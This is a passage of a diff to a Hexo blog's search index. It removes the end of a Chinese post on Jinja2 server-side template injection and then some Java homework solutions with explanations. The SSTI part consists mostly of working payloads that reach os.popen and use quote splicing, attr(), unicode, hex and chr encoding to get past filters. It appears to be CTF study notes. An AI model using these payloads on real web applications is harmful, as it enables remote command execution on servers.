-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(&#x27;0&#x27;).__subclasses__().__getitem__(&#x27;138&#x27;).__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="pop"><a href="#pop" class="headerlink" title="pop()"></a><code>pop()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.pop(&#39;a&#39;)</code></p>
-<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><h5 id="单双引号互换"><a href="#单双引号互换" class="headerlink" title="单双引号互换"></a>单双引号互换</h5><h5 id="http-get（用GET方式传入）"><a href="#http-get（用GET方式传入）" class="headerlink" title="http_get（用GET方式传入）"></a>http_get（用GET方式传入）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>等价于</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(request.args.func)(request.args.cmd).read()&#125;&#125;&amp;func=popen&amp;cmd=dir</span><br></pre></td></tr></table></figure>
-
-<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><h5 id="拼接关键字绕过"><a href="#拼接关键字绕过" class="headerlink" title="拼接关键字绕过"></a>拼接关键字绕过</h5><h6 id="引号内拼接"><a href="#引号内拼接" class="headerlink" title="引号内拼接"></a>引号内拼接</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;&#x27;lass__&#x27;][&#x27;__m&#x27;&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;+&#x27;lass__&#x27;][&#x27;__m&#x27;+&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;~&#x27;lass__&#x27;][&#x27;__m&#x27;~&#x27;ro__&#x27;][1]&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>参考payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;[&#x27;__cla&#x27;&#x27;ss__&#x27;][&#x27;__bas&#x27;&#x27;es__&#x27;][0][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[117][&#x27;__in&#x27;&#x27;it__&#x27;].__globals__[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h6 id="attr"><a href="#attr" class="headerlink" title="attr()"></a><code>attr()</code></h6><p>这个比较特殊</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;|attr(&#x27;__cl&#x27;&#x27;ass__&#x27;)|attr(&#x27;__ba&#x27;&#x27;se__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)&#125;&#125; //unicode绕过</span><br></pre></td></tr></table></figure>
-
-<p>参考payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(138)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)%&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里注意一下，其中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;__builtins__&#x27;]</span><br><span class="line">应当是</span><br><span class="line">|attr(&quot;get&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">而不仅仅是|attr(&quot;__builtins__&quot;)</span><br><span class="line">[&quot;eval&quot;]同理</span><br></pre></td></tr></table></figure>
-
-<p>unicode绕过参考payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(138)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;)&#125;&#125;</span><br><span class="line">//这里是ls /</span><br></pre></td></tr></table></figure>
-
-<p>当然，<code>attr()</code>用<code>[]</code>代替也可以，但是完全替代就出不来了…</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print(((((((((&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(140))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;))%&#125;</span><br></pre></td></tr></table></figure>
-
-<p>以上是盲注的写法</p>
-<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p><strong>base64</strong></p>
-<p>成功率有点低就是了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__</span><br><span class="line">等价于</span><br><span class="line">__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;))</span><br></pre></td></tr></table></figure>
-
-<p><strong>chr</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(10)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;)&#125;&#125;</span><br><span class="line">//这里不是ls /！！</span><br></pre></td></tr></table></figure>
-
-<h5 id="http-get"><a href="#http-get" class="headerlink" title="http_get"></a>http_get</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)().pop(138)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)(request.args.bui)|attr(request.args.geti)(request.args.ii)(request.args.hh)&#125;&#125;&amp;cla=__class__&amp;bas=__bases__&amp;sub=__subclasses__&amp;ini=__init__&amp;glo=__globals__&amp;bui=__builtins__&amp;hh=__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&amp;ii=eval&amp;geti=__getitem__</span><br></pre></td></tr></table></figure>
-
-<p>写一个16进制编码的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;[&quot;\x5F\x5Fc&quot;~&quot;lass&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fb&quot;~&quot;ases&quot;~&quot;\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubc&quot;~&quot;lasses&quot;~&quot;\x5F\x5F&quot;]()[166][&quot;\x5F\x5Fi&quot;~&quot;nit&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fg&quot;~&quot;lobals&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fbuiltins\x5F\x5F&quot;][&quot;eval&quot;](&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
-      <tags>
-        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -1769,109 +1777,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Java 作业 02</title>
-    <url>/2024/04/05/Java%20%E4%BD%9C%E4%B8%9A%202/</url>
-    <content><![CDATA[<h1 id="7-1-jmu-Java-01入门-第一个PTA上Java程序"><a href="#7-1-jmu-Java-01入门-第一个PTA上Java程序" class="headerlink" title="7-1 jmu-Java-01入门-第一个PTA上Java程序"></a>7-1 jmu-Java-01入门-第一个PTA上Java程序</h1><p>本题目要求读入若干对整数a和b，然后输出它们的和。</p>
-<h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>在一行中给出一对整数a和b。<br>以下输入样例只有两对，实际测试数据可能有多对值。</p>
-<h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>对每一组输入，如果a的绝对值&gt;1000，输出<code>|a|&gt;1000</code>，否则输出<code>a+b</code>的值。</p>
-<h3 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18 -299</span><br><span class="line">1001 -9</span><br><span class="line">-1001 8</span><br></pre></td></tr></table></figure>
-
-<h3 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-281</span><br><span class="line">|a|&gt;1000</span><br><span class="line">|a|&gt;1000</span><br></pre></td></tr></table></figure>
-
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (Math.abs(a) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;|a|&gt;1000&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(a + b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>以下是对</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (scanner.hasNextInt()) &#123;</span><br><span class="line">	<span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">	<span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>代码块的解释：</p>
-<ul>
-<li><code>while (scanner.hasNextInt())</code>: 这是一个循环，会一直执行，直到没有更多的整数可以从输入中读取。<code>scanner.hasNextInt()</code> 是一个检查，用于确定扫描器的下一个输入是否可以解释为一个整数。如果有可读取的整数，它返回 <code>true</code>，循环继续；否则返回 <code>false</code>，循环结束。</li>
-<li><code>int a = scanner.nextInt();</code>: 如果 <code>hasNextInt()</code> 返回 <code>true</code>，则通过 <code>nextInt()</code> 方法读取下一个整数，并将其赋值给变量 <code>a</code>。<code>nextInt()</code> 方法从输入中读取下一个整数，然后将其从输入流中消耗掉，意味着这个整数在之后的操作中不再可用。</li>
-<li><code>int b = scanner.nextInt();</code>: 在读取了 <code>a</code> 之后，程序继续读取下一个整数，并将其赋值给变量 <code>b</code>。同样，这是通过 <code>nextInt()</code> 方法实现的。</li>
-</ul>
-<h1 id="7-2-jmu-Java-01入门-取数字浮点数"><a href="#7-2-jmu-Java-01入门-取数字浮点数" class="headerlink" title="7-2 jmu-Java-01入门-取数字浮点数"></a>7-2 jmu-Java-01入门-取数字浮点数</h1><p>本题目要求读入若干以回车结束的字符串表示的整数或者浮点数，然后将每个数中的所有数字全部加总求和。</p>
-<h3 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>每行一个整数或者浮点数。保证在浮点数范围内。</p>
-<h3 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>整数或者浮点数中的数字之和。题目保证和在整型范围内。</p>
-<h3 id="输入样例-1"><a href="#输入样例-1" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-123.01</span><br><span class="line">234</span><br></pre></td></tr></table></figure>
-
-<h3 id="输出样例-1"><a href="#输出样例-1" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7</span><br><span class="line">9</span><br></pre></td></tr></table></figure>
-
-<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : input.toCharArray()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Character.isDigit(c)) &#123;</span><br><span class="line">                    sum += c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(sum);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>以下是对</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c : input.toCharArray()) &#123;</span><br><span class="line">	<span class="keyword">if</span> (Character.isDigit(c)) &#123;</span><br><span class="line">		sum += c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>代码块的解释：</p>
-<ul>
-<li><code>for (char c : input.toCharArray())</code>：这行代码将输入字符串转换成一个字符数组，并遍历每个字符。变量 <code>c</code> 代表循环中当前的字符。</li>
-<li><code>if (Character.isDigit(c))</code>：在循环内部，这行代码检查当前字符 <code>c</code> 是否是数字。<code>Character.isDigit(c)</code> 方法如果 <code>c</code> 是数字（0-9），则返回 <code>true</code>，否则返回 <code>false</code>。</li>
-<li><code>sum += c - &#39;0&#39;</code>：如果 <code>c</code> 是数字，就执行这行代码。它将字符 <code>c</code> 转换为其数值整数。由于 <code>c</code> 是代表数字的字符，从 <code>c</code> 中减去 <code>&#39;0&#39;</code> 就得到了那个数字的整数值。然后，这个整数值被加到 <code>sum</code> 上。</li>
-</ul>
-<p>例如，如果 <code>c</code> 是字符 <code>&#39;4&#39;</code>，<code>c - &#39;0&#39;</code> 将会是 <code>52 - 48</code>（在ASCII码中，’4’ 是 52，’0’ 是 48），等于 <code>4</code>。这个值然后被加到 <code>sum</code> 上，<code>sum</code> 累积了字符串中所有数字字符的总和。</p>
-<h1 id="7-3-jmu-Java-01入门-格式化输入输出与字符串"><a href="#7-3-jmu-Java-01入门-格式化输入输出与字符串" class="headerlink" title="7-3 jmu-Java-01入门-格式化输入输出与字符串"></a>7-3 jmu-Java-01入门-格式化输入输出与字符串</h1><h3 id="本题主要考察"><a href="#本题主要考察" class="headerlink" title="本题主要考察"></a>本题主要考察</h3><ul>
-<li>使用<code>Scanner</code>处理输入</li>
-<li>使用<code>System.out.printf</code>进行格式化输出</li>
-<li><code>String</code>常用方法与字符串常用操作</li>
-</ul>
-<h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><h3 id="输入说明："><a href="#输入说明：" class="headerlink" title="输入说明："></a>输入说明：</h3><ul>
-<li>输入<code>double</code>，然后输入3个浮点数。<strong>输出：</strong>从左到右依次输出3个double(均保留2位小数输出，宽度为5)，<strong>格式依次为：</strong>右侧填充空格，左侧填充空格，直接输出</li>
-<li>输入<code>int</code>，然后输入3个整数(以1个或多个空格分隔)。<strong>输出：</strong>将3个整数相加后输出。</li>
-<li>输入<code>str</code>，然后输入3个字符串。<strong>输出：</strong>去除空格，然后倒序输出3个字符。</li>
-<li>输入<code>line</code>，然后输入一行字符串。<strong>输出：</strong>转换成大写后输出。</li>
-<li>如果输入不是上面几个关键词，**输出:**输出**other**。</li>
-</ul>
-<h3 id="输出说明"><a href="#输出说明" class="headerlink" title="输出说明"></a>输出说明</h3><p><strong>choice&#x3D;你输入选项</strong><br>该选项对应的输出内容</p>
-<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><ol>
-<li>可使用<code>line.split(&quot;\\s+&quot;);</code>将以1个或多个空格分隔开的字符串分割并放入字符串数组。</li>
-<li><code>Scanner.nextLine</code>与Scanner的其他next函数混用有可能出错。</li>
-</ol>
-<h3 id="输入样例-2"><a href="#输入样例-2" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">double</span><br><span class="line">1.578 3.0 3.14259</span><br><span class="line">line</span><br><span class="line">aaaaaaaaaa</span><br><span class="line">int</span><br><span class="line">1      2    3</span><br><span class="line">str</span><br><span class="line">321 654 987</span><br><span class="line">line</span><br><span class="line">dddddddddd</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
-
-<h3 id="输出样例-2"><a href="#输出样例-2" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">choice=double</span><br><span class="line">1.58 , 3.00,3.14</span><br><span class="line">choice=line</span><br><span class="line">AAAAAAAAAA</span><br><span class="line">choice=int</span><br><span class="line">6</span><br><span class="line">choice=str</span><br><span class="line">987654321</span><br><span class="line">choice=line</span><br><span class="line">DDDDDDDDDD</span><br><span class="line">choice=end</span><br><span class="line">other</span><br></pre></td></tr></table></figure>
-
-<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        String choice;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">            choice = scanner.next();</span><br><span class="line">            System.out.printf(<span class="string">&quot;choice=%s\n&quot;</span>, choice);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;double&quot;</span>:</span><br><span class="line">                    <span class="type">double</span> <span class="variable">d1</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">                    <span class="type">double</span> <span class="variable">d2</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">                    <span class="type">double</span> <span class="variable">d3</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">                    System.out.printf(<span class="string">&quot;%-5.2f,%5.2f,%.2f\n&quot;</span>, d1, d2, d3);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;int&quot;</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">                    System.out.println(i1 + i2 + i3);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;str&quot;</span>:</span><br><span class="line">                    scanner.nextLine();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">                    String[] arr = str.split(<span class="string">&quot;\\s+&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                        System.out.print(arr[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;line&quot;</span>:</span><br><span class="line">                    scanner.nextLine();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">                    System.out.println(line.toUpperCase());</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;other&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>解释：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.printf(<span class="string">&quot;%-5.2f,%5.2f,%.2f\n&quot;</span>, d1, d2, d3);</span><br></pre></td></tr></table></figure>
-
-<p><code>%-5.2f</code>：这部分指定了输出宽度和对齐方式。<code>-</code> 表示左对齐，而 5 指定了最小输出宽度为 5 个字符。这意味着如果数值转换成的字符串长度小于5个字符，输出将通过添加空格到右侧来扩展到5个字符，从而保持左对齐。如果没有-，数字默认是右对齐的。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] arr = str.split(<span class="string">&quot;\\s+&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p><code>String[] arr = str.split(&quot;\\s+&quot;);</code> 这行代码是用来将字符串 <code>str</code> 分割成字符串数组 <code>arr</code> 的。这里具体的分割依据是正则表达式 <code>\\s+</code>。</p>
-<p>解析这个正则表达式：</p>
-<ul>
-<li><code>\\s</code> 代表空白字符，比如空格、制表符（Tab）、换行符等。</li>
-<li><code>+</code> 表示前面的字符（在这里是指空白字符）出现一次或多次。</li>
-</ul>
-<p>综合来看，<code>\\s+</code> 匹配一连串（一个或多个连续的）空白字符。因此，这个命令会根据一个或多个连续的空白字符来分割字符串 <code>str</code>，并将分割后的结果存储在字符串数组 <code>arr</code> 中。</p>
-<p>例如，如果 <code>str</code> 是 <code>&quot;hello world java programming&quot;</code>，那么执行这行代码后，<code>arr</code> 将会是一个包含四个元素的数组，分别是 <code>&quot;hello&quot;</code>, <code>&quot;world&quot;</code>, <code>&quot;java&quot;</code>, 和 <code>&quot;programming&quot;</code>。这是因为原始的字符串 <code>str</code> 被空格（它是一种空白字符）分割成了四部分。</p>
-<h1 id="7-4-jmu-Java-01入门-开根号"><a href="#7-4-jmu-Java-01入门-开根号" class="headerlink" title="7-4 jmu-Java-01入门-开根号"></a>7-4 jmu-Java-01入门-开根号</h1><p>使用逐步逼近法对给定数值x求开根号。</p>
-<p><strong>逐步逼近法说明</strong>：从0开始逐步累加步长值。</p>
-<p>步长&#x3D;0.0001，epsilon(误差)&#x3D;0.0001</p>
-<p><strong>循环继续的条件：</strong></p>
-<p><code>平方值&lt;x</code> 且 <code>|x-平方值| &gt; epsilon</code></p>
-<h3 id="说明与参考"><a href="#说明与参考" class="headerlink" title="说明与参考"></a>说明与参考</h3><ol>
-<li>数值输出保留6位小数，使用System.out.printf(“%.6f\n”)</li>
-<li>求平方，参考Math.pow函数。</li>
-<li>输入值&lt;0时，返回<strong>Double.NaN</strong></li>
-</ol>
-<h3 id="输入格式-2"><a href="#输入格式-2" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>任意数值</p>
-<h3 id="输出格式-2"><a href="#输出格式-2" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>对每一组输入，在一行中输出其开根号。保留6位小数</p>
-<h3 id="输入样例-3"><a href="#输入样例-3" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释-1</span><br><span class="line">0</span><br><span class="line">0.5</span><br><span class="line">0.36</span><br><span class="line">1</span><br><span class="line">6</span><br><span class="line">100</span><br><span class="line">131</span><br></pre></td></tr></table></figure>
-
-<h3 id="输出样例-3"><a href="#输出样例-3" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释NaN</span><br><span class="line">0.000000</span><br><span class="line">0.707100</span><br><span class="line">0.600000</span><br><span class="line">1.000000</span><br><span class="line">2.449500</span><br><span class="line">10.000000</span><br><span class="line">11.445600</span><br></pre></td></tr></table></figure>
-
